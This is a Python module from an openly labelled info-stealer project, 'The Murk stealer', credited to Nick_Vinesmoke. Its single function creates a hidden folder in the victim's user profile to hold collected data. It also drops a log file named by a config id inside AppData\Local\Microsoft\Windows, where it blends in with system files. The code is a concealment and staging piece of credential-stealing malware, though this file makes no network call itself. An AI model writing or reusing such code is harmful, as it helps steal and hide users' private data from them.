#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#


from os import environ, makedirs
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes
from preferences.config import config


def Folders():
    user = environ['USERPROFILE']
    try:
        makedirs(f'{user}\\{config.pathToLogs}')
        SetFileAttributes(f'{user}\\{config.pathToLogs}', FILE_ATTRIBUTE_HIDDEN)
    except:
        pass
    f = open(f'{user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}', 'w', encoding='utf-8')
    f.close()
    print(f"path to collected data: {user}\\{config.pathToLogs}")
    print(f"path to error_log: {user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}")


